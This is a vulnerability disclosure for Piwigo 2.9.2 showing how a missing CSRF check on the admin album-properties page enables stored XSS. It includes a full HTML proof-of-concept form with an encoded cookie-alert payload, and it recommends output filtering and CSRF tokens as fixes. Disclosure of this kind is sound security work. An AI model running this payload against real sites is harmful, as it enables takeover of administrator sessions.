### piwigo - XSS/CSRF vulnerability

#### ADLab of Venustech


Well,  when I pentest the latest version piwigo 2.9.2, I found some vulnerabilities here.

```
http://demo.com/piwigo/admin.php?page=album-3-properties
```

#### CSRF:

For example, the admin panel has no csrf protection here , we can do something evilly to the admin user.


##### XSS[stored xss]:

With the csrf , we can cheat the admin user to visit the evil webpage on the evil site:

```
http://evil.com/evil.htm
```

The xss poc content in the evil.htm:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://demo.com/piwigo/admin.php?page=album-3-properties" method="POST">
      <input type="hidden" name="name" value="test&apos;&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;cookie&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="comment" value="test" />
      <input type="hidden" name="parent" value="0" />
      <input type="hidden" name="visible" value="true" />
      <input type="hidden" name="commentable" value="true" />
      <input type="hidden" name="submit" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

At last, the admin user write evil stored-xss content to the admin panel by himself, and the evil attacker don't need to login into admin panel personally.

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/piwigo/xss1.png)

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/piwigo/xss2.png)

We should add some sec-character-filter to the output of the site , even in the admin panel.
On the other hand, adding csrf protection to the important operation in the admin panel,is also needed to be considered.




